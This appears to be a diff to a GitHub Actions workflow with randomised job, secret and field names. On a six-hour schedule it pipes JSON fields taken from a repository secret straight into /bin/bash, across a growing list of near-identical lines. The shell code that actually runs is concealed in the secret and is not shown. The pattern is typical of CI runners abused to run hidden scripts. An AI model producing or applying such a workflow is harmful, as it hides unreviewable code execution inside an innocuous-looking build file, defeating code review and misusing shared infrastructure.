@@ -1,23 +1,33 @@
 name: zhaorushan0987
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 5/6 * * *'
+    - cron: '43 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhaorushan0987
         env:
-          pnwax537: ${{ secrets.pnwax537 }}
+          jyae7: ${{ secrets.jyae7 }}
         run: |
-          echo $pnwax537 | jq -r .np9 | /bin/bash
-          echo $u6857 | jq -r .tmckl2161 | /bin/bash
-          echo $mhij82155 | jq -r .mdrn4868 | /bin/bash
-          echo $mpaqa82 | jq -r .mhfl898 | /bin/bash
-          echo $v704 | jq -r .psryt2335 | /bin/bash
-          echo $mdedu542 | jq -r .nz044 | /bin/bash
-          echo $frwt19719 | jq -r .jwl4638 | /bin/bash
+          echo $jyae7 | jq -r .fma11 | /bin/bash
+          echo $mn3 | jq -r .zq8259 | /bin/bash
+          echo $g87 | jq -r .pe05448 | /bin/bash
+          echo $whzx58060 | jq -r .muarx050 | /bin/bash
+          echo $ofrum88156 | jq -r .avftd06869 | /bin/bash
+          echo $oz3 | jq -r .wob397 | /bin/bash
+          echo $gv7 | jq -r .xw24308 | /bin/bash
+          echo $r10606 | jq -r .vusn96434 | /bin/bash
+          echo $njex63831 | jq -r .cuak07266 | /bin/bash
+          echo $mimyv94 | jq -r .mwjt55444 | /bin/bash
+          echo $cgtm94 | jq -r .ue91815 | /bin/bash
+          echo $sm9 | jq -r .m89288 | /bin/bash
+          echo $fsz28646 | jq -r .t7 | /bin/bash
+          echo $vc748 | jq -r .u28366 | /bin/bash
+          echo $j6455 | jq -r .tyynr97979 | /bin/bash
 
